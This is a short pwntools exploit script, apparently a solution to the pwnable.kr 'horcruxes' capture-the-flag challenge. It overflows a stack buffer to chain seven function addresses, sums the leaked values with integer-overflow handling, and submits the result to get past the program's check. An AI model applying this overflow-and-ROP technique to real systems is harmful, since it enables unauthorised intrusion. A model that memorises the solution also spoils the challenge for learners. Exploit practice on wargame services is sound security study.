from pwn import *
import sys
# context(log_level="debug")

A = 0x0809FE4B
B = 0x0809FE6A
C = 0x0809FE89
D = 0x0809FEA8
E = 0x0809FEC7
F = 0x0809FEE6
G = 0x0809FF05
rop_me=0x0809FFFC

payload = b"A"*(0x74 +4 )
payload += p32(A)
payload += p32(B)
payload += p32(C)
payload += p32(D)
payload += p32(E)
payload += p32(F)
payload += p32(G)
payload += p32(rop_me)

r = remote(host="pwnable.kr",port=9032)
r.sendline(b"1")
r.recvuntil(b"How many EXP did you earned? :")
r.sendline(payload)
r.recvline() 

unsign_int_max = 4294967296
int_max = 2147483647
sum = 0
for i in range(0,7):  
    res = str(r.recvline()).split('EXP +')[1]
    res = res.split(')')[0]
    print(i,res)
    tmp=int(res)
    sum += tmp

print('sum.' , sum)
sum  %= unsign_int_max # deal unsign int overflow
print('deal unsign int overflow', sum)
if sum > int_max:
    sum  -= unsign_int_max # deal int overflow
    print('deal int overflow', sum)

r.recvuntil(b"Menu:")
r.sendline(b"1")
r.recvuntil(b" : ")
r.sendline(str(sum))
ret = r.recvline()
print(ret)
if 'Voldemort' in str(ret)  :
    print('fail')
    sys.exit()


